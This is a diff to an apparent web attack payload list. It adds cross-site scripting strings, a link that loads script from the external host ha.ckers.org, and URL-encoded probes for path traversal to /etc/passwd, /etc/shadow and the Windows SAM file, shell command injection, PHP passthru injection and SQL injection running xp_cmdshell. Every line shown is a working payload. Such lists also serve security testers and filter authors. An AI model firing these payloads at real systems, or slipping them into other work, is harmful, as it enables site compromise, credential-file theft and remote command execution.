@@ -144,7 +144,7 @@ SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <A HREF="//www.google.com/">XSS</A>
 <A HREF="//google">XSS</A>
 <A HREF="http://google.com/">XSS</A>
-<A HREF="http://www.google.com./">XSS</A>
+<A HREF="http://ha.ckers.org/xss.js">XSS</A>
 <A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
 <A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
 <a href="javascript#document.write("XSS-XSS-XSS");">
@@ -341,6 +341,11 @@ perl -e 'print "&lt;SCR\0IPT&gt;alert(\"XSS\")&lt;/SCR\0IPT&gt;";' &gt; out
 &lt;SCRIPT&gt;a=/XSS/
 alert(a.source)&lt;/SCRIPT&gt;
 \";alert('XSS');//
+\\";alert('XSS');//
+\\\";alert('XSS');//
+\\\\";alert('XSS');//
+\\\\\";alert('XSS');//
+\\\\\\";alert('XSS');//
 &lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
 &lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
 &lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
@@ -381,6 +386,7 @@ exp/*&lt;A STYLE='no\xss:noxss("*//*");
 &lt;!--[if gte IE 4]&gt;
 &lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
 &lt;![endif]--&gt;
+';alert(String.fromCharCode(88,83,83))//\
 &lt;BASE HREF="javascript:alert('XSS');//"&gt;
 &lt;OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"&gt;&lt;/OBJECT&gt;
 &lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert('XSS')&gt;&lt;/OBJECT&gt;
@@ -391,6 +397,7 @@ a="get";&#10;b="URL(\"";&#10;c="javascript:";&#10;d="alert('XSS');\")";&#10;eval
 &lt;?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"&gt;
 &lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
 &lt;/HTML&gt;
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//\
 &lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC="javas]]&gt;&lt;![CDATA[cript:alert('XSS');"&gt;]]&gt;
 &lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
 &lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC="javas&lt;!-- --&gt;cript:alert('XSS')"&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
@@ -428,7 +435,7 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
 &lt;A HREF="http://ha.ckers.org@google"&gt;XSS&lt;/A&gt;
 &lt;A HREF="http://google:ha.ckers.org"&gt;XSS&lt;/A&gt;
 &lt;A HREF="http://google.com/"&gt;XSS&lt;/A&gt;
-&lt;A HREF="http://www.google.com./"&gt;XSS&lt;/A&gt;
+&lt;A HREF="http://ha.ckers.org/xss.js"&gt;XSS&lt;/A&gt;
 &lt;A HREF="javascript:document.location='http://www.google.com/'"&gt;XSS&lt;/A&gt;
 &lt;A HREF="http://www.gohttp://www.google.com/ogle.com/"&gt;XSS&lt;/A&gt;
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
@@ -444,3 +451,14 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
 <span onerror="alert(1)">text within a SPAN tag</span>
 "><script>alert(/31ric.com/)</script>
 "><SCRIPT>alert('XSS%20Testing')</SCRIPT>
+?xjAIpKU=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+?xjAIpKU=.%2F..%2F..%2F..%2Fetc%2Fmotd%00html
+?xjAIpKU=id%3Buname+-a
+?xjAIpKU=%3C%3F+passthru%28%22id%22%29%3B%3F%3E
+?xjAIpKU=..%2F..%2FWINNT%2Fsystem32%2Fcmd.exe%3Fdir%2Bc%3A%5C
+?xjAIpKU=type%2Bc%3A%5Cwinnt%5Crepair%5Csam._
+?xjAIpKU=ps+-aux%3B
+?xjAIpKU=..%2F..%2F..%2F..%2Fbin%2Fchgrp+nobody+%2Fetc%2Fshadow%7C
+?xjAIpKU=SELECT+TOP+1+name+FROM+sysusers
+?xjAIpKU=exec+master..xp_cmdshell+dir
+?xjAIpKU=exec+xp_cmdshell+dir
